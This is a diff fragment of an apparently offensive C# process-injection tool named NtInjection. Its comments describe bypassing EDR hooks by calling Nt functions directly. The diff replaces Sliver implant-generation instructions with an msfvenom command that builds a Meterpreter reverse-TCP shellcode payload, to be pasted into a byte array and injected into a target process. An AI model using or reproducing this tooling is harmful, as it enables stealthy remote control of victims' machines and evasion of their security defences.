@@ -6,8 +6,8 @@
 // functions are the lowest userland layer before the syscall, so EDR userland
 // hooks on kernel32 are bypassed.
 //
-// Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+// Shellcode (msfvenom):
+//   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //   Paste the byte[] array from sc.cs into `buf` below.
 //
 // Compile (Release, x64):
@@ -67,7 +67,7 @@ namespace NtInjection
                 targetPid = procs[0].Id;
             }
 
-            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
+            // ── Paste your shellcode here (msfvenom -f csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
